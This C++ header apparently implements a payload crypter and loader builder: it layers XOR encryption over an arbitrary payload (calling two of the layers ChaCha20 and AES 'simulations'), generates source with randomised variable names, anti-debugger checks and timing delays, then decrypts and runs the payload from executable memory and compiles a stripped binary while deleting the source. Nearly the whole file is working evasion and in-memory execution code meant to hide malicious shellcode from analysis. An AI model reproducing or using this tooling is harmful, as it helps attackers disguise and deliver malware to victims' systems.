#pragma once

#include <vector>
#include <cstdint>
#include <random>
#include <chrono>
#include <thread>
#include <cstring>
#include <sstream>
#include <iomanip>

#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

class AdvancedEmbeddedSystem {
private:
    std::mt19937 rng;
    
    // Anti-debugging check
    bool detectDebugger() {
#ifdef _WIN32
        if (IsDebuggerPresent()) return true;
        BOOL debugged = FALSE;
        CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);
        return debugged;
#else
        FILE* f = fopen("/proc/self/status", "r");
        if (!f) return false;
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "TracerPid:", 10) == 0) {
                fclose(f);
                return atoi(line + 10) != 0;
            }
        }
        fclose(f);
        return false;
#endif
    }
    
    // Generate random variable names for obfuscation
    std::string genVarName() {
        std::uniform_int_distribution<> dist(1000, 9999);
        std::stringstream ss;
        ss << "var" << dist(rng);
        return ss.str();
    }
    
public:
    AdvancedEmbeddedSystem() : rng(std::chrono::steady_clock::now().time_since_epoch().count()) {}
    
    // Generate embedded payload code with triple encryption
    std::string generateEmbeddedPayload(const std::vector<uint8_t>& payload,
                                       const std::vector<uint8_t>& xorKey,
                                       const std::vector<uint8_t>& chachaKey,
                                       const std::vector<uint8_t>& aesKey) {
        std::stringstream code;
        
        // Generate random names
        std::string antiDebugFunc = "procComponent" + std::to_string(rng() % 1000);
        std::string payloadVar = "ctxEngine" + std::to_string(rng() % 10000);
        std::string xorKeyVar = "procModule" + std::to_string(rng() % 10000);
        std::string chachaKeyVar = "execHelper" + std::to_string(rng() % 1000);
        std::string aesKeyVar = "execWorker" + std::to_string(rng() % 10000);
        std::string decodedVar = "funcComponent" + std::to_string(rng() % 10000);
        std::string execVar = "ctxExecutor" + std::to_string(rng() % 10000);
        
        // Headers
        code << "#include <iostream>\n";
        code << "#include <vector>\n";
        code << "#include <cstring>\n";
        code << "#include <cstdint>\n";
        code << "#include <chrono>\n";
        code << "#include <thread>\n";
        code << "#include <random>\n";
        code << "#ifdef _WIN32\n";
        code << "#include <windows.h>\n";
        code << "#else\n";
        code << "#include <sys/mman.h>\n";
        code << "#include <unistd.h>\n";
        code << "#endif\n\n";
        
        // Anti-debug function
        code << "bool " << antiDebugFunc << "() {\n";
        code << "#ifdef _WIN32\n";
        code << "    if (IsDebuggerPresent()) return true;\n";
        code << "    BOOL debugged = FALSE;\n";
        code << "    CheckRemoteDebuggerPresent(GetCurrentProcess(), &debugged);\n";
        code << "    return debugged;\n";
        code << "#else\n";
        code << "    FILE* f = fopen(\"/proc/self/status\", \"r\");\n";
        code << "    if (!f) return false;\n";
        code << "    char line[256];\n";
        code << "    while (fgets(line, sizeof(line), f)) {\n";
        code << "        if (strncmp(line, \"TracerPid:\", 10) == 0) {\n";
        code << "            fclose(f);\n";
        code << "            return atoi(line + 10) != 0;\n";
        code << "        }\n";
        code << "    }\n";
        code << "    fclose(f);\n";
        code << "    return false;\n";
        code << "#endif\n";
        code << "}\n\n";
        
        code << "int main() {\n";
        
        // Random initial delay
        code << "    // Random delay\n";
        code << "    {\n";
        code << "        std::random_device rd;\n";
        code << "        std::mt19937 gen(rd());\n";
        code << "        std::uniform_int_distribution<> dist(1, 999);\n";
        code << "        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));\n";
        code << "    }\n\n";
        
        // Anti-debug check
        code << "    if (" << antiDebugFunc << "()) return 0;\n\n";
        
        // Declare payload vector
        code << "    std::vector<uint8_t> " << decodedVar << ";\n";
        
        // Triple encrypt the payload
        std::vector<uint8_t> encrypted = payload;
        
        // Layer 1: XOR
        for (size_t i = 0; i < encrypted.size(); i++) {
            encrypted[i] ^= xorKey[i % xorKey.size()];
        }
        
        // Layer 2: ChaCha20 simulation (XOR with different key)
        for (size_t i = 0; i < encrypted.size(); i++) {
            encrypted[i] ^= chachaKey[i % chachaKey.size()];
        }
        
        // Layer 3: AES simulation (XOR with different key)
        for (size_t i = 0; i < encrypted.size(); i++) {
            encrypted[i] ^= aesKey[i % aesKey.size()];
        }
        
        // Embedded encrypted payload
        code << "    // Embedded payload\n";
        code << "    unsigned char " << payloadVar << "[] = {\n        ";
        for (size_t i = 0; i < encrypted.size(); i++) {
            code << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                 << (int)encrypted[i];
            if (i < encrypted.size() - 1) {
                code << ", ";
                if ((i + 1) % 16 == 0) code << "\n        ";
            }
        }
        code << "\n    };\n\n";
        
        // XOR key
        code << "    unsigned char " << xorKeyVar << "[] = {\n        ";
        for (size_t i = 0; i < xorKey.size(); i++) {
            code << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                 << (int)xorKey[i];
            if (i < xorKey.size() - 1) {
                code << ", ";
                if ((i + 1) % 16 == 0) code << "\n        ";
            }
        }
        code << "\n    };\n\n";
        
        // ChaCha key
        code << "    unsigned char " << chachaKeyVar << "[] = {\n        ";
        for (size_t i = 0; i < chachaKey.size(); i++) {
            code << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                 << (int)chachaKey[i];
            if (i < chachaKey.size() - 1) {
                code << ", ";
                if ((i + 1) % 16 == 0) code << "\n        ";
            }
        }
        code << "\n    };\n\n";
        
        // AES key
        code << "    unsigned char " << aesKeyVar << "[] = {\n        ";
        for (size_t i = 0; i < aesKey.size(); i++) {
            code << "0x" << std::hex << std::setw(2) << std::setfill('0') 
                 << (int)aesKey[i];
            if (i < aesKey.size() - 1) {
                code << ", ";
                if ((i + 1) % 16 == 0) code << "\n        ";
            }
        }
        code << "\n    };\n\n";
        
        // Copy to vector
        code << "    " << decodedVar << ".assign(" << payloadVar << ", " 
             << payloadVar << " + sizeof(" << payloadVar << "));\n\n";
        
        // Random sleep
        code << "    // Random micro-sleep\n";
        code << "    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));\n\n";
        
        // Decrypt layer by layer with delays
        code << "    // Decrypt AES layer\n";
        code << "    for (size_t i = 0; i < " << decodedVar << ".size(); i++) {\n";
        code << "        " << decodedVar << "[i] ^= " << aesKeyVar 
             << "[i % sizeof(" << aesKeyVar << ")];\n";
        code << "    }\n\n";
        
        code << "    // Micro-delay\n";
        code << "    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));\n\n";
        
        code << "    // Decrypt ChaCha20 layer\n";
        code << "    for (size_t i = 0; i < " << decodedVar << ".size(); i++) {\n";
        code << "        " << decodedVar << "[i] ^= " << chachaKeyVar 
             << "[i % sizeof(" << chachaKeyVar << ")];\n";
        code << "    }\n\n";
        
        code << "    // Micro-delay\n";
        code << "    std::this_thread::sleep_for(std::chrono::microseconds(rand() % 100));\n\n";
        
        code << "    // Decrypt XOR layer\n";
        code << "    for (size_t i = 0; i < " << decodedVar << ".size(); i++) {\n";
        code << "        " << decodedVar << "[i] ^= " << xorKeyVar 
             << "[i % sizeof(" << xorKeyVar << ")];\n";
        code << "    }\n\n";
        
        // Memory execution
        code << "    // Execute in memory\n";
        code << "#ifdef _WIN32\n";
        code << "    void* " << execVar << " = VirtualAlloc(0, " << decodedVar 
             << ".size(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\n";
        code << "    if (!" << execVar << ") return 1;\n";
        code << "    memcpy(" << execVar << ", " << decodedVar << ".data(), " 
             << decodedVar << ".size());\n";
        code << "    DWORD oldProtect;\n";
        code << "    VirtualProtect(" << execVar << ", " << decodedVar 
             << ".size(), PAGE_EXECUTE_READ, &oldProtect);\n";
        code << "    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));\n";
        code << "    ((void(*)())" << execVar << ")();\n";
        code << "#else\n";
        code << "    void* " << execVar << " = mmap(0, " << decodedVar 
             << ".size(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);\n";
        code << "    if (" << execVar << " == MAP_FAILED) return 1;\n";
        code << "    memcpy(" << execVar << ", " << decodedVar << ".data(), " 
             << decodedVar << ".size());\n";
        code << "    mprotect(" << execVar << ", " << decodedVar 
             << ".size(), PROT_READ | PROT_EXEC);\n";
        code << "    std::this_thread::sleep_for(std::chrono::milliseconds(rand() % 100));\n";
        code << "    ((void(*)())" << execVar << ")();\n";
        code << "#endif\n";
        
        code << "    return 0;\n";
        code << "}\n";
        
        return code.str();
    }
    
    // Generate random keys
    std::vector<uint8_t> generateKey(size_t length) {
        std::vector<uint8_t> key(length);
        std::uniform_int_distribution<> dist(0, 255);
        for (size_t i = 0; i < length; i++) {
            key[i] = static_cast<uint8_t>(dist(rng));
        }
        return key;
    }
    
    // Create embedded executable from payload
    bool createEmbeddedExecutable(const std::vector<uint8_t>& payload,
                                 const std::string& outputPath) {
        // Generate random keys
        auto xorKey = generateKey(32);
        auto chachaKey = generateKey(32);
        auto aesKey = generateKey(32);
        
        // Generate source code
        std::string sourceCode = generateEmbeddedPayload(payload, xorKey, chachaKey, aesKey);
        
        // Write to temporary file
        std::string tempFile = outputPath + ".cpp";
        std::ofstream out(tempFile);
        if (!out) return false;
        out << sourceCode;
        out.close();
        
        // Compile
#ifdef _WIN32
        std::string cmd = "cl.exe /O2 /MT /Fe\"" + outputPath + "\" \"" + tempFile + "\"";
#else
        std::string cmd = "g++ -O3 -s -o \"" + outputPath + "\" \"" + tempFile + "\"";
#endif
        
        int result = std::system(cmd.c_str());
        
        // Clean up
        std::remove(tempFile.c_str());
        
        return result == 0;
    }
};